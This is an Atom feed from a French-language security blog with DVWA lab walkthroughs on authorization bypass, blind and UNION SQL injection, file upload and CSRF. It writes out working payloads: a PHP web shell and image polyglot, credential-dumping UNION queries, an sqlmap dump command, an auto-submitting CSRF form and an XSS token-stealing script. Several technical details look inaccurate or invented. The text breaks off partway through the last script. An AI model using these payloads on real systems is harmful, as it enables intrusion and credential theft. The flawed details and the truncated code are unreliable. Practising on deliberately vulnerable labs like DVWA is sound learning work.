<?xml version="1.0" encoding="UTF-8"?>
<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
    <title>Theora59 Devs Adventures - web</title>
    <link rel="self" type="application/atom+xml" href="https://theora59-dev.github.io/blog/tags/web/atom.xml"/>
    <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/"/>
    <generator uri="https://www.getzola.org/">Zola</generator>
    <updated>2025-12-26T00:00:00+00:00</updated>
    <id>https://theora59-dev.github.io/blog/tags/web/atom.xml</id>
    <entry xml:lang="en">
        <title>DVWA - Authorization Bypass</title>
        <published>2025-12-26T00:00:00+00:00</published>
        <updated>2025-12-26T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/authorization-bypass/"/>
        <id>https://theora59-dev.github.io/blog/cours/authorization-bypass/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/authorization-bypass/">&lt;p&gt;L&#x27;Authorization Bypass exploite les failles où l&#x27;autorisation (permissions utilisateur) n&#x27;est pas vérifiée côté serveur, malgré une authentification réussie. DVWA simule des contrôles RBAC (Role-Based Access Control) défaillants.&lt;&#x2F;p&gt;
&lt;table&gt;&lt;thead&gt;&lt;tr&gt;&lt;th&gt;Autorisation&lt;&#x2F;th&gt;&lt;th&gt;Authentification&lt;&#x2F;th&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;thead&gt;&lt;tbody&gt;
&lt;tr&gt;&lt;td&gt;QUI ?&lt;&#x2F;td&gt;&lt;td&gt;Oui&#x2F;Non (Pas très sécurisé)&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;
&lt;&#x2F;tbody&gt;&lt;&#x2F;table&gt;
&lt;h2 id=&quot;easy&quot;&gt;Easy&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Principe : Serveur vérifie authentification (login requis) mais PAS l&#x27;autorisation (admin only).&lt;&#x2F;li&gt;
&lt;li&gt;Exploitation : Naviguez directement vers http:&#x2F;&#x2F;dvwa&#x2F;security.php (page admin normalement cachée).&lt;&#x2F;li&gt;
&lt;li&gt;Résultat : Interface complète DVWA Security s&#x27;affiche sans restriction, permettant de changer les niveaux Low&#x2F;Medium&#x2F;High.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Principe : Cookie DVWA stocke rôle utilisateur (admin&#x2F;user), non validé à chaque requête.&lt;&#x2F;li&gt;
&lt;li&gt;Étapes Burp :
&lt;ul&gt;
&lt;li&gt;Login user normal → interceptez requête, notez Cookie: PHPSESSID=xxx; DVWA=user&lt;&#x2F;li&gt;
&lt;li&gt;Modifier : DVWA=admin&lt;&#x2F;li&gt;
&lt;li&gt;Forward → Accès admin complet (Security, Create&#x2F;Reset DB)&lt;&#x2F;li&gt;
&lt;li&gt;Preuve : Page DVWA Security accessible avec compte basique.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;hard&quot;&gt;Hard&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Principe : Erreur 403&#x2F;Access Denied sur page principale, mais développeur oublie de protéger les endpoints backend&#x2F;sous-pages.
Tests systématiques :&lt;pre data-lang=&quot;url&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-url &quot;&gt;&lt;code class=&quot;language-url&quot; data-lang=&quot;url&quot;&gt;&lt;span&gt;403 sur &#x2F;admin.php → tester :
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;admin.php?test=1
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;admin&#x2F;action.php
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;admin&#x2F;save.php
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;admin&#x2F;settings&#x2F;
&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;admin&#x2F;config
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - Injection SQL (BLIND)</title>
        <published>2025-12-25T00:00:00+00:00</published>
        <updated>2025-12-25T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/sql-injection-blind/"/>
        <id>https://theora59-dev.github.io/blog/cours/sql-injection-blind/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/sql-injection-blind/">&lt;p&gt;SQL Injection Blind = injection sans retour de données direct (pas de dump colonnes). L&#x27;app répond binaire : &quot;User ID exists&quot; (TRUE) ou &quot;User ID is MISSING&quot; (FALSE). Exploitation via Boolean-based (différences réponse) ou Time-based (délais SLEEP).&lt;&#x2F;p&gt;
&lt;h2 id=&quot;easy&quot;&gt;Easy&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Query : &lt;code&gt;SELECT * FROM users WHERE id=&#x27;$id&#x27; AND &amp;gt;0&lt;&#x2F;code&gt;&lt;&#x2F;li&gt;
&lt;li&gt;Boolean : &lt;code&gt;1&#x27; AND 1=1#&lt;&#x2F;code&gt; → &quot;exists&quot; (TRUE) ; &lt;code&gt;1&#x27; AND 1=2#&lt;&#x2F;code&gt; → &quot;missing&quot; (FALSE).&lt;&#x2F;li&gt;
&lt;li&gt;Time : &lt;code&gt;1&#x27; AND IF(1=1,SLEEP(5),0)#&lt;&#x2F;code&gt; → délai 5s confirme vulnérabilité.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Déterminer nb colonnes : 1&#x27; ORDER BY 1# (exists) → 1&#x27; ORDER BY 3# (missing) = 2 colonnes.&lt;&#x2F;li&gt;
&lt;li&gt;Extraire DB name (longueur puis chars):&lt;pre data-lang=&quot;sql&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-sql &quot;&gt;&lt;code class=&quot;language-sql&quot; data-lang=&quot;sql&quot;&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt; AND (SELECT LENGTH(database()))=4#
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39; AND ASCII(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;SUBSTRING&lt;&#x2F;span&gt;&lt;span&gt;((&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SELECT&lt;&#x2F;span&gt;&lt;span&gt; database()),&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;))=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;100&lt;&#x2F;span&gt;&lt;span&gt;;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;# → &amp;#39;d&amp;#39;=100
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Répétez pour chaque position&#x2F;charset (32-126) → &quot;dvwa&quot;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;hard&quot;&gt;Hard&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Time extraction (plus fiable, pas de diff réponse visible) :&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;1&amp;#39; AND IF(ASCII(SUBSTRING((SELECT user FROM users LIMIT 0,1),1,1))&amp;gt;100,SLEEP(5),0)#
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;Si délai 5s → char &amp;gt;100 (ex. &#x27;g&#x27;=103)&lt;&#x2F;li&gt;
&lt;li&gt;Pas délai → char ≤100&lt;&#x2F;li&gt;
&lt;li&gt;Binaire search (64,96,112...) + SLEEP confirme bit par bit.&lt;&#x2F;li&gt;
&lt;li&gt;Peut s&#x27;exploiter avec sqlmap, par exemple:&lt;pre data-lang=&quot;bash&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-bash &quot;&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;sqlmap -u &lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;dvwa&#x2F;vulnerabilities&#x2F;sqli_blind&#x2F;?id=1&amp;amp;Submit=Submit&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --cookie&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;security=high;PHPSESSID=xxx&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --technique&lt;&#x2F;span&gt;&lt;span&gt;=BT&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt; --dump
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - File Upload</title>
        <published>2025-12-24T00:00:00+00:00</published>
        <updated>2025-12-24T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/file-upload/"/>
        <id>https://theora59-dev.github.io/blog/cours/file-upload/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/file-upload/">&lt;h2 id=&quot;easy&quot;&gt;Easy&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Aucune validation : créez &lt;code&gt;shell.php&lt;&#x2F;code&gt; avec &lt;code&gt;&amp;lt;?php system($_GET[&#x27;cmd&#x27;]); ?&amp;gt;&lt;&#x2F;code&gt; et uploadez-le directement.&lt;&#x2F;li&gt;
&lt;li&gt;Accédez à &lt;code&gt;hackable&#x2F;uploads&#x2F;shell.php?cmd=whoami&lt;&#x2F;code&gt; pour avoir une RCE.&lt;&#x2F;li&gt;
&lt;li&gt;Le serveur exécute le PHP car aucune restriction d&#x27;extension ou contenu.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Vérifie &lt;code&gt;$_FILES[&#x27;uploadedFile&#x27;][&#x27;type&#x27;] == &#x27;image&#x2F;jpeg&#x27; || &#x27;image&#x2F;png&#x27;&lt;&#x2F;code&gt; (Type MIME coté client modifiable).&lt;&#x2F;li&gt;
&lt;li&gt;Bypass : Burp Suite → interceptez, changez &lt;code&gt;Content-Type: image&#x2F;jpeg&lt;&#x2F;code&gt; et nom &lt;code&gt;shell.jpg&lt;&#x2F;code&gt;, uploadez PHP dedans.&lt;&#x2F;li&gt;
&lt;li&gt;Exécutez via LFI : &lt;code&gt;fi&#x2F;?page=..&#x2F;..&#x2F;hackable&#x2F;uploads&#x2F;shell.jpg&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;hard&quot;&gt;Hard&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Extension : &lt;code&gt;getenv(&#x27;DVWA_EXT&#x27;)&lt;&#x2F;code&gt; whitelist &lt;code&gt;.jpg|.png|.gif&lt;&#x2F;code&gt;, prend la dernière extension → &lt;code&gt;shell.php.jpg&lt;&#x2F;code&gt;, donc ça passe.&lt;&#x2F;li&gt;
&lt;li&gt;Magic Bytes : Vérifie la signature du fichier (premiers bytes) avec &lt;code&gt;finfo_file()&lt;&#x2F;code&gt; → &lt;code&gt;polyglot&lt;&#x2F;code&gt; : GIF89a + PHP.&lt;&#x2F;li&gt;
&lt;li&gt;Créez &lt;code&gt;shell.php.jpg&lt;&#x2F;code&gt; : &lt;code&gt;GIF89a&amp;lt;?php system($_GET[&#x27;cmd&#x27;]); ?&amp;gt;&lt;&#x2F;code&gt;, uploadez, accédez &lt;code&gt;hackable&#x2F;uploads&#x2F;shell.php.jpg?cmd=id&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - Injection SQL</title>
        <published>2025-12-24T00:00:00+00:00</published>
        <updated>2025-12-24T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/sql-injection/"/>
        <id>https://theora59-dev.github.io/blog/cours/sql-injection/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/sql-injection/">&lt;ul&gt;
&lt;li&gt;DVWA simule les injections SQL via une requête vulnérable...&lt;pre data-lang=&quot;SQL&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-SQL &quot;&gt;&lt;code class=&quot;language-SQL&quot; data-lang=&quot;SQL&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;SELECT&lt;&#x2F;span&gt;&lt;span&gt; first_name, last_name &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;FROM&lt;&#x2F;span&gt;&lt;span&gt; users &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;WHERE&lt;&#x2F;span&gt;&lt;span&gt; user_id = &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;$id&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
... où $id est l&#x27;entrée utilisateur non sanitizée, permettant de manipuler la logique SQL pour extraire&#x2F;dumper la base ou bypass l&#x27;authentification.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;easy&quot;&gt;Easy&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Aucune protection : entrez &lt;code&gt;1&#x27; UNION SELECT user,password FROM users--&lt;&#x2F;code&gt; dans le champ &lt;code&gt;User ID&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;UNION&lt;&#x2F;code&gt; concatène les résultats de la table users (colonnes user, password MD5), &lt;code&gt;--&lt;&#x2F;code&gt; commente le reste de la query.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Résultat : dump des credentials admin (ex. admin:5f4dcc3b5aa765d61d8327deb882cf99).&lt;&#x2F;p&gt;
&lt;img src=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;20251223_160317.9b7dd1a299cf17e3.png&quot; alt=&quot;Responsive hi-res image&quot;
     width=&quot;686&quot; height=&quot;631&quot;
     sizes=&quot;(min-width: 920px) 784px, (min-width: 700px) calc(82vw + 46px), calc(100vw - 40px)&quot; 
     srcset=&quot;https:&#x2F;&#x2F;theora59-dev.github.io&#x2F;blog&#x2F;processed_images&#x2F;20251223_160317.10fc17aee30788d5.png 640w&quot;
     loading=&quot;lazy&quot;&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Applique &lt;code&gt;mysql_real_escape_string()&lt;&#x2F;code&gt; mais sans quotes autour du paramètre (user_id = $id au lieu de = &#x27;$id&#x27;).&lt;&#x2F;li&gt;
&lt;li&gt;Payload : &lt;code&gt;1 UNION SELECT user,password FROM users#&lt;&#x2F;code&gt; (dropdown POST intercepté via Burp, # commente).&lt;&#x2F;li&gt;
&lt;li&gt;L&#x27;escape n&#x27;affecte pas les opérateurs&#x2F;logique hors strings.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;hard&quot;&gt;Hard&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Input via popup stocké en $_SESSION[&#x27;id&#x27;], query identique au Low mais indirect.&lt;&#x2F;li&gt;
&lt;li&gt;Interceptez la requête avec burp, &lt;code&gt;id=1&#x27; UNION SELECT user,password FROM users--&lt;&#x2F;code&gt;, puis forward.&lt;&#x2F;li&gt;
&lt;li&gt;Même payload fonctionne car session non sanitizée côté query (Le payload persiste avec la session).&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>DVWA - CSRF</title>
        <published>2025-12-23T00:00:00+00:00</published>
        <updated>2025-12-23T00:00:00+00:00</updated>
        
        <author>
          <name>
            
              Unknown
            
          </name>
        </author>
        
        <link rel="alternate" type="text/html" href="https://theora59-dev.github.io/blog/cours/csrf/"/>
        <id>https://theora59-dev.github.io/blog/cours/csrf/</id>
        
        <content type="html" xml:base="https://theora59-dev.github.io/blog/cours/csrf/">&lt;blockquote&gt;
&lt;p&gt;DVWA simule les attaques CSRF (Cross-Site Request Forgery) via un formulaire de changement de mot de passe sans protections adéquates. L&#x27;objectif est de forcer un utilisateur authentifié à modifier son mot de passe sans son consentement, en exploitant la confiance basée sur les cookies de session.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;h2 id=&quot;easy&quot;&gt;Easy&lt;&#x2F;h2&gt;
&lt;p&gt;Aucune protection : capturez la requête POST vers &lt;code&gt;vulnerabilities&#x2F;csrf&#x2F;&lt;&#x2F;code&gt; via Burp ou DevTools (méthode POST, &lt;code&gt;password_new=pwned&lt;&#x2F;code&gt;, &lt;code&gt;password_conf=pwned&lt;&#x2F;code&gt;).&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Créez &lt;code&gt;csrf.html&lt;&#x2F;code&gt; avec:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;form &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;action&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;dvwa&#x2F;csrf.php&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;method&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;POST&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hidden&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password_new&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;pwned&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &#x2F;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;hidden&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;password_conf&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;pwned&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;
&lt;&#x2F;span&gt;&lt;span&gt;    &#x2F;&amp;gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;input &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;type&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;submit&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;value&lt;&#x2F;span&gt;&lt;span&gt;=&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Cliquez&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot; &#x2F;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;form&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    document.forms[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;].&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;submit&lt;&#x2F;span&gt;&lt;span&gt;();
&lt;&#x2F;span&gt;&lt;span&gt;&amp;lt;&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Servez la page à la victime loggée : le navigateur soumet automatiquement avec ses cookies, modifiant le mot de passe.&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;medium&quot;&gt;Medium&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;Vérifie $_SERVER[&#x27;HTTP_REFERER&#x27;] pour matcher le domaine DVWA, bloquant les requêtes externes directes.&lt;&#x2F;li&gt;
&lt;li&gt;On peut le Bypass via &lt;code&gt;&amp;lt;img src=&quot;http:&#x2F;&#x2F;dvwa&#x2F;vulnerabilities&#x2F;csrf&#x2F;?password_new=pwned&amp;amp;password_conf=pwned&amp;amp;user_token=xxx&quot;&amp;gt;&lt;&#x2F;code&gt; (GET forcé par img src, referer absent ou spoofable).&lt;&#x2F;li&gt;
&lt;li&gt;Ou utilisez un formulaire POST avec JS pour définir document.referrer via meta-refresh, préservant le referer DVWA lors du submit.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;h2 id=&quot;hard&quot;&gt;Hard&lt;&#x2F;h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Génère un token unique (user_token) validé côté serveur + referer check.
Exploitez via XSS Stored&#x2F;Reflected pour voler le token : injectez:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;html&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-html &quot;&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span&gt;&amp;lt;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;script&lt;&#x2F;span&gt;&lt;span&gt;&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fetch&lt;&#x2F;span&gt;&lt;span&gt;(&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;http:&#x2F;&#x2F;dvwa&#x2F;guestbook&#x2F;&lt;&#x2F;span&gt;&lt;span&gt;&amp;quot;)
&lt;&#x2F;span&gt;&lt;span&gt;      .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;then&lt;&#x2F;span&gt;&lt;span&gt;((r) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;text&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;      .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;then&lt;&#x2F;span&gt;&lt;span&gt;((t) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;=&amp;gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;fetch&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;t&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;match&lt;&#x2F;span&gt;&lt;span&gt;(&#x2F;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;name=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;[&amp;#39;&amp;quot;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;user_token&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;[&amp;#39;&amp;quot;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt; value=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;[&amp;#39;&amp;quot;]&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;[&lt;&#x2F;span&gt;&lt;span&gt;^&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;&amp;#39;&amp;quot;]&lt;&#x2F;span&gt;&lt;span&gt;+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;[&amp;#39;&amp;quot;]&lt;&#x2F;span&gt;&lt;span&gt;&#x2F;)[&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1&lt;&#x2F;span&gt;&lt;span&gt;])
&lt;&#x2F;span&gt;&lt;span&gt;          .&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;then&lt;&#x2F;span&gt;&lt;span&gt;((r) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;=&amp;gt; &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;r&lt;&#x2F;span&gt;&lt;span&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;text&lt;&#x2F;span&gt;&lt;span&gt;())
